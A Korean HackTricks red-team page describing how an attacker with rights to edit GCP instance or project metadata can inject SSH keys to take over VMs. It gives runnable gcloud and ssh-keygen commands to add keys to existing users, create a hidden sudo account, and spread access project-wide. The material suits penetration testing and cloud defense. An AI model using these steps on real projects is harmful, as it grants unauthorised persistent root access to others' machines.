# GCP - 사용자 정의 SSH 메타데이터 추가

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)를 **팔로우**하세요.
* **Hacking 트릭을 공유하려면** [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하세요.

</details>

## 메타데이터 수정 <a href="#modifying-the-metadata" id="modifying-the-metadata"></a>

인스턴스의 메타데이터 수정은 **공격자가 필요한 권한을 획득하면 중대한 보안 위험**을 초래할 수 있습니다.

### **사용자 정의 메타데이터에 SSH 키 통합**

GCP에서는 **Linux 시스템**이 종종 [Google Compute Engine을 위한 Python Linux Guest Environment](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts)에서 스크립트를 실행합니다. 이에 중요한 구성 요소는 [계정 데몬](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts)으로, 이는 인스턴스 메타데이터 엔드포인트를 **정기적으로 확인하여 인증된 SSH 공개 키에 대한 업데이트를 찾습니다**.

따라서, 공격자가 사용자 정의 메타데이터를 수정할 수 있다면, 데몬이 새로운 공개 키를 찾아서 **로컬 시스템에 통합**시킬 수 있습니다. 이 키는 기존 사용자의 `~/.ssh/authorized_keys` 파일에 추가되거나, 키의 형식에 따라 **`sudo` 권한을 가진 새로운 사용자를 생성**할 수도 있습니다. 그리고 공격자는 호스트를 침해할 수 있게 됩니다.

### **기존 권한이 있는 사용자에 SSH 키 추가**

1. **인스턴스에서 기존 SSH 키 확인:**
- 인스턴스와 해당 메타데이터를 설명하는 명령을 실행하여 기존 SSH 키를 찾습니다. 출력에서 관련 섹션은 `metadata` 아래에 있으며, 특히 `ssh-keys` 키입니다.
```bash
gcloud compute instances describe [INSTANCE] --zone [ZONE]
```
- SSH 키의 형식에 주의하세요: 사용자 이름은 콜론으로 구분된 키 앞에 옵니다.

2. **SSH 키 메타데이터를 위한 텍스트 파일 준비:**
- 사용자 이름과 해당하는 SSH 키의 세부 정보를 `meta.txt`라는 텍스트 파일에 저장합니다. 이는 새로운 키를 추가하는 동시에 기존 키를 보존하기 위해 필수적입니다.

3. **대상 사용자(`alice` 예시)를 위한 새로운 SSH 키 생성:**
- `ssh-keygen` 명령을 사용하여 새로운 SSH 키를 생성하고, 주석 필드(`-C`)가 대상 사용자 이름과 일치하는지 확인합니다.
```bash
ssh-keygen -t rsa -C "alice" -f ./key -P "" && cat ./key.pub
```
- 인스턴스의 메타데이터에서 찾은 형식과 유사하게 새로운 공개 키를 `meta.txt`에 추가합니다.

4. **인스턴스의 SSH 키 메타데이터 업데이트:**
- `gcloud compute instances add-metadata` 명령을 사용하여 업데이트된 SSH 키 메타데이터를 인스턴스에 적용합니다.
```bash
gcloud compute instances add-metadata [INSTANCE] --metadata-from-file ssh-keys=meta.txt
```

5. **새로운 SSH 키를 사용하여 인스턴스에 액세스:**
- 새로운 키를 사용하여 SSH로 인스턴스에 연결하고, 대상 사용자(`alice` 예시)의 쉘에 액세스합니다.
```bash
ssh -i ./key alice@localhost
sudo id
```

### **새로운 권한을 가진 사용자 생성 및 SSH 키 추가**

흥미로운 사용자를 찾지 못한 경우, 새로운 사용자를 생성하고 `sudo` 권한을 부여할 수 있습니다.
```bash
# define the new account username
NEWUSER="definitelynotahacker"

# create a key
ssh-keygen -t rsa -C "$NEWUSER" -f ./key -P ""

# create the input meta file
NEWKEY="$(cat ./key.pub)"
echo "$NEWUSER:$NEWKEY" > ./meta.txt

# update the instance metadata
gcloud compute instances add-metadata [INSTANCE_NAME] --metadata-from-file ssh-keys=meta.txt

# ssh to the new account
ssh -i ./key "$NEWUSER"@localhost
```
### 프로젝트 수준에서 SSH 키 사용하기 <a href="#sshing-around" id="sshing-around"></a>

클라우드 환경에서 **프로젝트 수준에서 SSH 키를 적용**하여 여러 가상 머신(VM)에 대한 SSH 액세스 범위를 확장할 수 있습니다. 이 접근 방식은 프로젝트 내에서 명시적으로 프로젝트 전체 SSH 키를 차단하지 않은 경우 프로젝트 내의 모든 인스턴스에 대한 SSH 액세스를 허용합니다. 다음은 요약된 가이드입니다:

1. **프로젝트 수준에서 SSH 키 적용:**
- `gcloud compute project-info add-metadata` 명령을 사용하여 `meta.txt`에서 SSH 키를 프로젝트의 메타데이터에 추가합니다. 이 작업은 SSH 키가 프로젝트 내의 모든 VM에서 인식되도록 보장하며, VM이 "프로젝트 전체 SSH 키 차단" 옵션을 사용하지 않은 경우에만 해당합니다.
```bash
gcloud compute project-info add-metadata --metadata-from-file ssh-keys=meta.txt
```

2. **프로젝트 전체 키를 사용하여 인스턴스에 SSH 접속:**
- 프로젝트 전체 SSH 키가 설정되어 있으면 프로젝트 내의 모든 인스턴스에 SSH로 접속할 수 있습니다. 프로젝트 전체 키를 차단하지 않은 인스턴스는 SSH 키를 허용하여 액세스를 허용합니다.
- 인스턴스에 직접 SSH로 접속하는 방법은 `gcloud compute ssh [INSTANCE]` 명령을 사용하는 것입니다. 이 명령은 현재 사용자 이름과 프로젝트 수준에서 설정된 SSH 키를 사용하여 액세스를 시도합니다.


# 참고 자료
* [https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/](https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 제로에서 영웅까지 AWS 해킹 배우기<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* HackTricks에서 **회사 광고를 보거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family)인 [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**를** 팔로우하세요.
* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 여러분의 해킹 기술을 공유하세요.

</details>
